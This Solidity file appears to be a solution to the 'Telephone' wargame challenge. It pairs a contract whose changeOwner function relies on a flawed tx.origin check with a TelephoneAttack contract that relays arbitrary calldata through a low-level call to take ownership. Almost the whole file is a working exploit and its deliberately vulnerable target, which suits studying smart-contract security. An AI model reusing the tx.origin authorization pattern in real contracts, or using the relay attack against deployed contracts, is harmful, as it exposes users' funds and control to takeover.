// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

/* solhint-disable */
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

/* solhint-enable */

contract TelephoneAttack {
    address private _owner;

    modifier onlyOwner() {
        require(msg.sender == _owner, 'unauthorized');
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    function execute(address target, bytes calldata message)
        external
        onlyOwner
    {
        // solhint-disable avoid-low-level-calls
        (bool success, ) = target.call(message);
        require(success, 'failed');
    }
}
